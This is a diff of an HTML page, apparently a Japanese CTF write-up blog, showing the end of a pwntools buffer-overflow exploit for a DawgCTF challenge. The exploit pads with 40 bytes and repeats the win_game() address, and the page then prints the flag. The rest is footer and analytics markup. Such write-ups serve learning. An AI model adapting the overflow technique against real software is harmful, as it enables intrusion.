+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">c</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">20</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">20</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401256</span><span class="p">)</span>  <span class="c1"># win_game()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401256</span><span class="p">)</span>  <span class="c1"># win_game()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401256</span><span class="p">)</span>  <span class="c1"># win_game()</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <p>Flag: <code>DawgCTF{n3w_h1gh_sc0r3!!}</code></p>
-<p><br /></p>
+<br />
 <p>実のところ、&lsquo;B&rsquo;の20バイトの辺りとか、win_game()のアドレスの繰り返しとか、あまり考えずにトライ・アンド・エラーでテキトーにやってます。</p>
 <p>ちゃんと理解した上でやらねば。。。</p>
 <p><br /><br />
@@ -513,7 +509,7 @@ win_game()のアドレスは以下の通りです。gdbのi funcで確認して�
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -548,20 +544,21 @@ win_game()のアドレスは以下の通りです。gdbのi funcで確認して�
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
